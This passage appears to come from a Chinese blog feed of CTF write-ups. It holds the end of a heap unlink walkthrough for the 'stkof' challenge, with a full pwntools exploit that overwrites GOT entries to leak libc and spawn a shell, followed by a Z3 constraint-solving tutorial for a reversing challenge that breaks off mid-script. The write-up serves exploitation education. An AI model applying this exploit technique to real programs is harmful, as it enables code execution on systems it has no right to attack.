0x10</span></span><br><span class="line">payload +=  <span class="string">'a'</span>*<span class="number">16</span>  <span class="comment">#padding</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x30</span>)<span class="comment">#overwrite chunk3's prev_size </span></span><br><span class="line">payload += p64(<span class="number">0x90</span>)<span class="comment">#overwrite chunk3's size</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure><ul><li>执行以后我们就能在chunk2里面伪造(套娃)一个chunk，然后覆盖掉<code>chunk3</code>的<code>prev_size</code>和<code>size里的prev_inuse标志位</code>。</li></ul><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><ul><li>先看一下unlink前我们<code>head</code>附近的内存</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000001921020</span><br><span class="line">0x602150:	0x0000000001921540	0x0000000001921580</span><br></pre></td></tr></table></figure><ul><li>当程序unlink时，</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#  unlink --&gt; </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *(fd+0x18)=bk</span></span><br><span class="line"><span class="comment"># *(bk+0x10)=fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 则</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *(head + 16) = head + 16 - 0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 而 (head + 16) == target</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 即 *target = target-0x18，这里也证明了前面所说的unlink的作用。</span></span><br></pre></td></tr></table></figure><ul><li>再来查看一下head附近的内存。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000001921020</span><br><span class="line">0x602150:	0x0000000000602138	0x0000000000000000</span><br></pre></td></tr></table></figure><ul><li>chunk3被<code>free</code>掉并置<code>NULL</code>了，chunk2的指针变成<code>head - 0x8</code>了。</li></ul><h2 id="偷梁换柱得shell"><a href="#偷梁换柱得shell" class="headerlink" title="偷梁换柱得shell"></a>偷梁换柱得shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span>                 <span class="comment">#padding</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'free'</span>]) <span class="comment">#0下标</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'puts'</span>]) <span class="comment">#1下标</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'atoi'</span>]) <span class="comment">#2下标</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure><ul><li>执行以后，head附近的内存应该是这样。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602140 - 0x10</span><br><span class="line">0x602130:   0x0000000000000000   0x6161616161616161</span><br><span class="line">0x602140:      elf.got[&apos;free&apos;]   elf.got[&apos;puts&apos;]</span><br><span class="line">0x602150:      elf.got[&apos;atoi&apos;]   0x0000000000000000</span><br></pre></td></tr></table></figure><ul><li>接下来我们把<code>free_got</code>改成<code>puts_plt</code>，那么我们执行<code>free(1)</code>的话就相当于执行<code>puts(puts_got)</code>。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[free@got] = puts@plt</span></span><br><span class="line">payload = p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><ul><li>那么可以通过<code>free(1)</code>获取<code>puts</code>的真实地址<code>puts_addr</code>，进而获得<code>libcbase</code>和<code>system</code>了。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = c.recvuntil(<span class="string">'\nOK\n'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> puts_addr</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><ul><li>然后我们有了system，就可以把<code>atoi_got</code>换成<code>system</code>了，从而获得shell。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[atoi@got] = system</span></span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-完整exp"><a href="#0x04-完整exp" class="headerlink" title="0x04 完整exp"></a>0x04 完整exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./stkof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,cont)</span>:</span></span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line">    c.sendline(str(len(cont)))</span><br><span class="line">    c.send(cont)</span><br><span class="line">    c.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">target = head + <span class="number">16</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span>         <span class="comment">#padding</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)    <span class="comment">#size</span></span><br><span class="line">payload += p64(fd)  <span class="comment">#fd = target - 0x18</span></span><br><span class="line">payload += p64(bk)  <span class="comment">#bk = target - 0x10</span></span><br><span class="line">payload +=  <span class="string">'a'</span>*<span class="number">16</span>  <span class="comment">#padding</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x30</span>)<span class="comment">#overwrite chunk3's prev_size </span></span><br><span class="line">payload += p64(<span class="number">0x90</span>)<span class="comment">#overwrite chunk3's size</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink </span></span><br><span class="line">free(<span class="number">3</span>) </span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  unlink --&gt; </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *(fd+0x18)=bk</span></span><br><span class="line"><span class="comment"># *(bk+0x10)=fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 则</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *(head + 16) = head + 16 - 0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 而 (head + 16) == target</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 即 *target = target-0x18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span>                 <span class="comment">#padding</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'free'</span>]) <span class="comment">#0下标</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'puts'</span>]) <span class="comment">#1下标</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'atoi'</span>]) <span class="comment">#2下标</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[free@got] = puts@plt</span></span><br><span class="line">payload = p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = c.recvuntil(<span class="string">'\nOK\n'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line">log.success(<span class="string">'libcbase = '</span> + hex(libcbase))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#[atoi@got] = system</span></span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>Z3约束初体验</title>
    <url>/2019/06/14/Z3%E7%BA%A6%E6%9D%9F%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/24194.jpg" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33856255&auto=1&height=66"></iframe><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><ul><li>拿一道CTF题目为例,主函数如下</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190614224718.png" alt></p><ul><li>这是一个关于矩阵的题目。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190614224800.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190614224812.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190614224822.png" alt></p><ul><li><p>思路很清晰,函数名称也直接表达出来函数作用了。 但是求解是现在的难题了。</p></li><li><p>如果考虑正向爆破… 难度太大太大,太费时间了, 毕竟有27个未知数呢。</p></li><li><p>为什么是27而不是36？ 因为根据</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gets(flag);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !flag[i] )</span><br><span class="line">  &#123;</span><br><span class="line">    flag[i] = <span class="number">1</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v4 != <span class="number">9</span> )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><p>需要让v4 = 9，那么也就需要 !flag[i]满足9次,而flag的大小是36, 即 只输入27个数就能满足题意。</p></li><li><p>现在需要提取出来题目给的矩阵(即题中的d)</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = [<span class="number">0x12027</span>,<span class="number">0x0F296</span>,<span class="number">0x0BF0E</span>,<span class="number">0x0D84C</span>,<span class="number">0x91D8</span>,<span class="number">0x297</span>,</span><br><span class="line">    <span class="number">0x0F296</span>,<span class="number">0x0D830</span>,<span class="number">0x0A326</span>,<span class="number">0x0B010</span>,<span class="number">0x7627</span>,<span class="number">0x230</span>,</span><br><span class="line">    <span class="number">0x0BF0E</span>,<span class="number">0x0A326</span>,<span class="number">0x8FEB</span>,<span class="number">0x879D</span>,<span class="number">0x70C3</span>,<span class="number">0x1BD</span>,</span><br><span class="line">    <span class="number">0x0D84C</span>,<span class="number">0x0B010</span>,<span class="number">0x879D</span>,<span class="number">0x0B00D</span>,<span class="number">0x6E4F</span>,<span class="number">0x1F7</span>,</span><br><span class="line">    <span class="number">0x91D8</span>,<span class="number">0x7627</span>,<span class="number">0x70C3</span>,<span class="number">0x6E4F</span>,<span class="number">0x9BDC</span>,<span class="number">0x15C</span>,</span><br><span class="line">    <span class="number">0x297</span>,<span class="number">0x230</span>,<span class="number">0x1BD</span>,<span class="number">0x1F7</span>,<span class="number">0x15C</span>,<span class="number">0x6</span>]</span><br></pre></td></tr></table></figure><ul><li>网上找到一脚本:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#引入time模块只是为了看一看这个程序跑完需要多长时间</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">t1 = time.time()</span><br><span class="line"><span class="comment">#创建一个解决方案实例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"><span class="comment">#flag长度先设置为36，包括尾部的9个1</span></span><br><span class="line">flag = [Int(<span class="string">'flag%d'</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="comment">#保存flag的矩阵</span></span><br><span class="line">a = [i <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"><span class="comment">#保存flag的转置矩阵</span></span><br><span class="line">b = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="comment">#保存a*b的矩阵</span></span><br><span class="line">c = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="comment">#堆中正确flag的运算结果</span></span><br><span class="line">d = [<span class="number">0x12027</span>,<span class="number">0x0F296</span>,<span class="number">0x0BF0E</span>,<span class="number">0x0D84C</span>,<span class="number">0x91D8</span>,<span class="number">0x297</span>,</span><br><span class="line">    <span class="number">0x0F296</span>,<span class="number">0x0D830</span>,<span class="number">0x0A326</span>,<span class="number">0x0B010</span>,<span class="number">0x7627</span>,<span class="number">0x230</span>,</span><br><span class="line">    <span class="number">0x0BF0E</span>,<span class="number">0x0A326</span>,<span class="number">0x8FEB</span>,<span class="number">0x879D</span>,<span class="number">0x70C3</span>,<span class="number">0x1BD</span>,</span><br><span class="line">    <span class="number">0x0D84C</span>,<span class="number">0x0B010</span>,<span class="number">0x879D</span>,<span class="number">0x0B00D</span>,<span class="number">0x6E4F</span>,<span class="number">0x1F7</span>,</span><br><span class="line">    <span class="number">0x91D8</span>,<span class="number">0x7627</span>,<span class="number">0x70C3</span>,<span class="number">0x6E4F</span>,<span class="number">0x9BDC</span>,<span class="number">0x15C</span>,</span><br><span class="line">    <span class="number">0x297</span>,<span class="number">0x230</span>,<span class="number">0x1BD</span>,<span class="number">0x1F7</span>,<span class="number">0x15C</span>,<span class="number">0x6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得a的转置矩阵</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        b[i+<span class="number">6</span>*j] = a[<span class="number">6</span>*i+j]</span><br><span class="line"></span><br><span class="line"><span class="comment">#运算a*b</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            c[j+<span class="number">6</span>*i] = c[j+<span class="number">6</span>*i] + a[<span class="number">6</span>*i+k]*b[<span class="number">6</span>*k+j]</span><br><span class="line">        <span class="comment">#添加约束，正确flag的运算结果</span></span><br><span class="line">        solver.add(simplify(c[j+<span class="number">6</span>*i]) == d[j+<span class="number">6</span>*i])</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加约束，除了尾部，flag的字符一定在可见字符范围内</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">36</span><span class="number">-10</span>):</span><br><span class="line">    solver.add(flag[i]&gt;=<span class="number">32</span>)</span><br><span class="line">    solver.add(flag[i]&lt;=<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加约束，由于flag有格式，前6位一定为whctf&#123;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    solver.add(flag[i] == ord(<span class="string">'whctf&#123;'</span>[i]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加约束，根据题意flag的尾部为9个1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span><span class="number">-9</span>,<span class="number">36</span>):</span><br><span class="line">    solver.add(flag[i] == <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加约束，flag的最后一个肯定是&#125;</span></span><br><span class="line">solver.add(flag[<span class="number">-10</span>] == ord(<span class="string">'&#125;'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里一定要有，不check的话会报错</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    f = <span class="string">''</span></span><br><span class="line">    <span class="comment">#获得结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">        f+=chr(eval(str(solver.model().eval(flag[i]))))</span><br><span class="line">    <span class="comment">#输出flag</span></span><br><span class="line">    <span class="keyword">print</span> f</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'error'</span>)</span><br><span class="line">t2 = time.time()</span><br><span class="line">print(t2-t1)</span><br></pre></td></tr></table></figure><ul><li><p>鉴于有27个未知数,正如求解27元方程组一般,如果知道的关系越多,那么求解起来越容易, 求解所用时间也就越少。</p></li><li><p>我把 “#添加约束，由于flag有格式，前6位一定为whctf{ “这个条件约束去掉以后再去跑的话 跑了74秒,而按照上面脚本跑的话,只需要3.2秒。</p></li><li><p>不难看出z3求解的约束条件就是把题中给的关系进行还原,然后让约束求解器进行求解,我们所须要做的工作就是把条件列出来。</p></li></ul><hr><ul><li><p>顺带说一下 s.append(m[flag[i]].as_long()) 中的as_long()的大致作用。</p></li><li><p>如果去掉这个.as_long(),而只保留m[flag[i]]</p></li><li><p>则下面for i in s: 中的i的类型是instance类型,从而导致 flag+=chr(i)中的chr()方法无法正常使用(因为chr()里面需要传入int型的数据。)</p></li><li><p>所以这个as_long()的功能大概就是把数据转为int类型吧。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/298.jpg" alt></p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><ul><li>拿一道22元方程组求解的数学题目为例,直接上脚本了。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">t1 = time.time()</span><br><span class="line"></span><br><span class="line">a = [Int(<span class="string">'a%d'</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">2</span>*a[<span class="number">0</span>]+<span class="number">3</span>*a[<span class="number">1</span>]+<span class="number">5</span>*a[<span class="number">2</span>]+<span class="number">7</span>*a[<span class="number">3</span>]+<span class="number">11</span>*a[<span class="number">4</span>]+<span class="number">13</span>*a[<span class="number">5</span>]+<span class="number">17</span>*a[<span class="number">6</span>]+<span class="number">19</span>*a[<span class="number">7</span>]+<span class="number">23</span>*a[<span class="number">8</span>]+<span class="number">29</span>*a[<span class="number">9</span>]+<span class="number">31</span>*a[<span class="number">10</span>]+<span class="number">37</span>*a[<span class="number">11</span>]+<span class="number">41</span>*a[<span class="number">12</span>]+<span class="number">43</span>*a[<span class="number">13</span>]+<span class="number">47</span>*a[<span class="number">14</span>]+<span class="number">53</span>*a[<span class="number">15</span>]+<span class="number">59</span>*a[<span class="number">16</span>]+<span class="number">61</span>*a[<span class="number">17</span>]+<span class="number">67</span>*a[<span class="number">18</span>]+<span class="number">71</span>*a[<span class="number">19</span>]+<span class="number">73</span>*a[<span class="number">20</span>]+<span class="number">79</span>*a[<span class="number">21</span>]==<span class="number">83948</span>)</span><br><span class="line">s.add(<span class="number">83</span>*a[<span class="number">0</span>]+<span class="number">89</span>*a[<span class="number">1</span>]+<span class="number">97</span>*a[<span class="number">2</span>]+<span class="number">101</span>*a[<span class="number">3</span>]+<span class="number">103</span>*a[<span class="number">4</span>]+<span class="number">107</span>*a[<span class="number">5</span>]+<span class="number">109</span>*a[<span class="number">6</span>]+<span class="number">113</span>*a[<span class="number">7</span>]+<span class="number">127</span>*a[<span class="number">8</span>]+<span class="number">131</span>*a[<span class="number">9</span>]+<span class="number">137</span>*a[<span class="number">10</span>]+<span class="number">139</span>*a[<span class="number">11</span>]+<span class="number">149</span>*a[<span class="number">12</span>]+<span class="number">151</span>*a[<span class="number">13</span>]+<span class="number">157</span>*a[<span class="number">14</span>]+<span class="number">163</span>*a[<span class="number">15</span>]+<span class="number">167</span>*a[<span class="number">16</span>]+<span class="number">173</span>*a[<span class="number">17</span>]+<span class="number">179</span>*a[<span class="number">18</span>]+<span class="number">181</span>*a[<span class="number">19</span>]+<span class="number">191</span>*a[<span class="number">20</span>]+<span class="number">193</span>*a[<span class="number">21</span>]==<span class="number">321979</span>)</span><br><span class="line">s.add(<span class="number">197</span>*a[<span class="number">0</span>]+<span class="number">199</span>*a[<span class="number">1</span>]+<span class="number">211</span>*a[<span class="number">2</span>]+<span class="number">223</span>*a[<span class="number">3</span>]+<span class="number">227</span>*a[<span class="number">4</span>]+<span class="number">229</span>*a[<span class="number">5</span>]+<span class="number">233</span>*a[<span class="number">6</span>]+<span class="number">239</span>*a[<span class="number">7</span>]+<span class="number">241</span>*a[<span class="number">8</span>]+<span class="number">251</span>*a[<span class="number">9</span>]+<span class="number">257</span>*a[<span class="number">10</span>]+<span class="number">263</span>*a[<span class="number">11</span>]+<span class="number">269</span>*a[<span class="number">12</span>]+<span class="number">271</span>*a[<span class="number">13</span>]+<span class="number">277</span>*a[<span class="number">14</span>]+<span class="number">281</span>*a[<span class="number">15</span>]+<span class="number">283</span>*a[<span class="number">16</span>]+<span class="number">293</span>*a[<span class="number">17</span>]+<span class="number">307</span>*a[<span class="number">18</span>]+<span class="number">311</span>*a[<span class="number">19</span>]+<span class="number">313</span>*a[<span class="number">20</span>]+<span class="number">317</span>*a[<span class="number">21</span>]==<span class="number">602643</span>)</span><br><span class="line">s.add(<span class="number">331</span>*a[<span class="number">0</span>]+<span class="number">337</span>*a[<span class="number">1</span>]+<span class="number">347</span>*a[<span class="number">2</span>]+<span class="number">349</span>*a[<span class="number">3</span>]+<span class="number">353</span>*a[<span class="number">4</span>]+<span class="number">359</span>*a[<span class="number">5</span>]+<span class="number">367</span>*a[<span class="number">6</span>]+<span class="number">373</span>*a[<span class="number">7</span>]+<span class="number">379</span>*a[<span class="number">8</span>]+<span class="number">383</span>*a[<span class="number">9</span>]+<span class="number">389</span>*a[<span class="number">10</span>]+<span class="number">397</span>*a[<span class="number">11</span>]+<span class="number">401</span>*a[<span class="number">12</span>]+<span class="number">409</span>*a[<span class="number">13</span>]+<span class="number">419</span>*a[<span class="number">14</span>]+<span class="number">421</span>*a[<span class="number">15</span>]+<span class="number">431</span>*a[<span class="number">16</span>]+<span class="number">433</span>*a[<span class="number">17</span>]+<span class="number">439</span>*a[<span class="number">18</span>]+<span class="number">443</span>*a[<span class="number">19</span>]+<span class="number">449</span>*a[<span class="number">20</span>]+<span class="number">457</span>*a[<span class="number">21</span>]==<span class="number">917405</span>)</span><br><span class="line">s.add(<span class="number">461</span>*a[<span class="number">0</span>]+<span class="number">463</span>*a[<span class="number">1</span>]+<span class="number">467</span>*a[<span class="number">2</span>]+<span class="number">479</span>*a[<span class="number">3</span>]+<span class="number">487</span>*a[<span class="number">4</span>]+<span class="number">491</span>*a[<span class="number">5</span>]+<span class="number">499</span>*a[<span class="number">6</span>]+<span class="number">503</span>*a[<span class="number">7</span>]+<span class="number">509</span>*a[<span class="number">8</span>]+<span class="number">521</span>*a[<span class="number">9</span>]+<span class="number">523</span>*a[<span class="number">10</span>]+<span class="number">541</span>*a[<span class="number">11</span>]+<span class="number">547</span>*a[<span class="number">12</span>]+<span class="number">557</span>*a[<span class="number">13</span>]+<span class="number">563</span>*a[<span class="number">14</span>]+<span class="number">569</span>*a[<span class="number">15</span>]+<span class="number">571</span>*a[<span class="number">16</span>]+<span class="number">577</span>*a[<span class="number">17</span>]+<span class="number">587</span>*a[<span class="number">18</span>]+<span class="number">593</span>*a[<span class="number">19</span>]+<span class="number">599</span>*a[<span class="number">20</span>]+<span class="number">601</span>*a[<span class="number">21</span>]==<span class="number">1238849</span>)</span><br><span class="line">s.add(<span class="number">607</span>*a[<span class="number">0</span>]+<span class="number">613</span>*a[<span class="number">1</span>]+<span class="number">617</span>*a[<span class="number">2</span>]+<span class="number">619</span>*a[<span class="number">3</span>]+<span class="number">631</span>*a[<span class="number">4</span>]+<span class="number">641</span>*a[<span class="number">5</span>]+<span class="number">643</span>*a[<span class="number">6</span>]+<span class="number">647</span>*a[<span class="number">7</span>]+<span class="number">653</span>*a[<span class="number">8</span>]+<span class="number">659</span>*a[<span class="number">9</span>]+<span class="number">661</span>*a[<span class="number">10</span>]+<span class="number">673</span>*a[<span class="number">11</span>]+<span class="number">677</span>*a[<span class="number">12</span>]+<span class="number">683</span>*a[<span class="number">13</span>]+<span class="number">691</span>*a[<span class="number">14</span>]+<span class="number">701</span>*a[<span class="number">15</span>]+<span class="number">709</span>*a[<span class="number">16</span>]+<span class="number">719</span>*a[<span class="number">17</span>]+<span class="number">727</span>*a[<span class="number">18</span>]+<span class="number">733</span>*a[<span class="number">19</span>]+<span class="number">739</span>*a[<span class="number">20</span>]+<span class="number">743</span>*a[<span class="number">21</span>]==<span class="number">1565673</span>)</span><br><span class="line">s.add(<span class="number">751</span>*a[<span class="number">0</span>]+<span class="number">757</span>*a[<span class="number">1</span>]+<span class="number">761</span>*a[<span class="number">2</span>]+<span class="number">769</span>*a[<span class="number">3</span>]+<span class="number">773</span>*a[<span class="number">4</span>]+<span class="number">787</span>*a[<span class="number">5</span>]+<span class="number">797</span>*a[<span class="number">6</span>]+<span class="number">809</span>*a[<span class="number">7</span>]+<span class="number">811</span>*a[<span class="number">8</span>]+<span class="number">821</span>*a[<span class="number">9</span>]+<span class="number">823</span>*a[<span class="number">10</span>]+<span class="number">827</span>*a[<span class="number">11</span>]+<span class="number">829</span>*a[<span class="number">12</span>]+<span class="number">839</span>*a[<span class="number">13</span>]+<span class="number">853</span>*a[<span class="number">14</span>]+<span class="number">857</span>*a[<span class="number">15</span>]+<span class="number">859</span>*a[<span class="number">16</span>]+<span class="number">863</span>*a[<span class="number">17</span>]+<span class="number">877</span>*a[<span class="number">18</span>]+<span class="number">881</span>*a[<span class="number">19</span>]+<span class="number">883</span>*a[<span class="number">20</span>]+<span class="number">887</span>*a[<span class="number">21</span>]==<span class="number">1917643</span>)</span><br><span class="line">s.add(<span class="number">907</span>*a[<span class="number">0</span>]+<span class="number">911</span>*a[<span class="number">1</span>]+<span class="number">919</span>*a[<span class="number">2</span>]+<span class="number">929</span>*a[<span class="number">3</span>]+<span class="number">937</span>*a[<span class="number">4</span>]+<span class="number">941</span>*a[<span class="number">5</span>]+<span class="number">947</span>*a[<span class="number">6</span>]+<span class="number">953</span>*a[<span class="number">7</span>]+<span class="number">967</span>*a[<span class="number">8</span>]+<span class="number">971</span>*a[<span class="number">9</span>]+<span class="number">977</span>*a[<span class="number">10</span>]+<span class="number">983</span>*a[<span class="number">11</span>]+<span class="number">991</span>*a[<span class="number">12</span>]+<span class="number">997</span>*a[<span class="number">13</span>]+<span class="number">1009</span>*a[<span class="number">14</span>]+<span class="number">1013</span>*a[<span class="number">15</span>]+<span class="number">1019</span>*a[<span class="number">16</span>]+<span class="number">1021</span>*a[<span 